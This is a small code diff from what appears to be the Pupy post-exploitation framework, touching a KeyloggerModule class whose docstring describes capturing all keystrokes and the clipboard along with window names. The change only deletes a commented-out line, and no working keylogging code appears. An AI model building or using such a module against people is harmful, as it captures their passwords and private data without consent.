@@ -20,7 +20,7 @@ class KeyloggerModule(PupyModule):
         A keylogger to monitor all keyboards interaction including the clipboard :-)
         The clipboard is also monitored and the dump includes the window name in which the keys are beeing typed
     """
-    #max_clients=1
+
     unique_instance = True
     dependencies = {
         'windows': [ 'pupwinutils.keylogger' ],
